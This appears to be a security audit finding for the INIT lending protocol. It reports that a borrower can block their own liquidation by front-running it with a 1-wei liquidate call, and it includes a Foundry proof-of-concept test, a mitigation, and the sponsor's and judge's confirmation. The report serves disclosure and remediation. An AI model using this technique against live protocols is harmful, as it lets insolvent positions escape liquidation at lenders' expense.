@@ -1,0 +1,17 @@
+[H-01] Liquidations can be prevented by frontrunning and liquidating 1 debt (or more) due to wrong assumption in POS_MANAGER
+Submitted by0x73696d616f
+Users can avoid being liquidated if they frontrun liquidation calls with a liquidate call with 1 wei. Or, they may do a partial liquidation and avoid being liquidated before the interest reaches the value of the debt pre liquidation. The total interest stored in__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterestwould also be wrong.
+Proof of Concept
+ThePOS_MANAGERstores the total interest in__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest. FunctionupdatePosDebtShares()assumesthatILendingPool(_pool).debtShareToAmtCurrent(currDebtShares)is always increasing, but this is not the case, as a liquidation may happen that reduces the current debt amount. This leads to calls toupdatePosDebtShares()reverting.
+The most relevant is when liquidating, such that users could liquidate themselves for small amounts (1) and prevent liqudiations in the same block. This is because the debt accrual happens over time, so if the block.timestamp is the same, no debt accrual will happen. Thus, if a liquidate call with 1 amount frontruns a liquidate call with any amount, the second call will revert.
+A user could still stop liquidations for as long as the accrued interest doesn’t reach the last debt value before liquidation, if the user liquidated a bigger part of the debt.
+Add the following test toTestInitCore.sol:
+functiontest_POC_Liquidate_reverts_frontrunning_PosManager_WrongAssumption()public{addresspoolUSDT=address(lendingPools[USDT]);addresspoolWBTC=address(lendingPools[WBTC]);_setTargetHealthAfterLiquidation_e18(1,type(uint64).max);// by pass max health after liquidate capped_setFixedRateIRM(poolWBTC,0.1e18);// 10% per secuintcollAmt;uintborrAmt;{uintcollUSD=100_000;uintborrUSDMax=80_000;collAmt=_priceToTokenAmt(USDT,collUSD);borrAmt=_priceToTokenAmt(WBTC,borrUSDMax);}addressliquidator=BOB;deal(USDT,ALICE,collAmt);deal(WBTC,liquidator,borrAmt*2);// provides liquidity for borrow_fundPool(poolWBTC,borrAmt);// create position and collateralizeuintposId=_createPos(ALICE,ALICE,1);_collateralizePosition(ALICE,posId,poolUSDT,collAmt,bytes(''));// borrow_borrow(ALICE,posId,poolWBTC,borrAmt,bytes(''));// fast forward time and accrue interestvm.warp(block.timestamp+1seconds);ILendingPool(poolWBTC).accrueInterest();uintdebtShares=positionManager.getPosDebtShares(posId,poolWBTC);_liquidate(liquidator,posId,1,poolWBTC,poolUSDT,false,bytes(''));// liquidate all debtShares_liquidate(liquidator,posId,1000,poolWBTC,poolUSDT,false,bytes('panic'));}
+Tools Used
+Vscode, Foundry
+Recommended Mitigation Steps
+Update the user’s last debt position__posBorrInfos[_posId].borrExtraInfos[_pool].totalIntereston_repay().
+fez-init (INIT) confirmed
+hansfriese (Judge) commented:
+After discussing internally with the sponsor/warden, we’ve confirmed the issue.
+Here is a part of the discussion:“When it frontruns the liquidation with 1 share, it removes 1 share and 2 debt.When it calculates the amount again in the following liquidation, the shares will be worth 1 less and it reverts.”As a mitigation, we can updateextraInfo.totalInterestonly whendebtAmtCurrent > extraInfo.lastDebtAmt.High is appropriate as the main invariant might be broken temporarily while repaying.
